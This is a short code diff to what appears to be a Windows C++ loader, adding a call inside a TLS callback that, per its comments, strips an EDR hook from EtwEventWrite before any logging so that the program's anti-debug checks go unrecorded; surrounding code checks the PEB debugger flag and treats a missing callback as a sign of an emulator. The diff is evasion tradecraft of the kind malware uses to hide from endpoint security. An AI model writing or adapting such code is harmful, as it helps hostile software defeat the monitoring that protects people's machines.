@@ -9,6 +9,7 @@
 // 
 
 #include "TlsCallback.h"
+#include "KnownDlls.h"
 #include <intrin.h>
 
 // ─── Global flag set by TLS callback ───
@@ -20,6 +21,11 @@ volatile LONG g_TlsCallbackRan = 0;
 static void NTAPI TlsCallbackFunc(PVOID DllHandle, DWORD Reason, PVOID Reserved)
 {
     if (Reason != DLL_PROCESS_ATTACH) return;
+
+    // ── Mini-unhook: restore EtwEventWrite before any ETW logging fires ──
+    // EDR hooks EtwEventWrite early — TLS callback runs before WinMain,
+    // so this removes the hook before our anti-debug checks can be logged.
+    KnownDlls::MiniUnhookForTls();
 
     // ── Early anti-debug: check BeingDebugged flag in PEB ──
     BOOL isDebugged = FALSE;
@@ -96,6 +102,8 @@ namespace TlsCallbackLoader
     {
         // This function exists just to ensure the TLS callback object file
         // is linked in. The actual callback is registered via the linker pragma.
+        // TLS callback also runs KnownDlls::MiniUnhookForTls() to restore
+        // EtwEventWrite before any WinMain code executes.
         // Check if TLS callback ran — if not, something is wrong (emulator?)
         if (InterlockedCompareExchange(&g_TlsCallbackRan, 0, 0) == 0)
         {
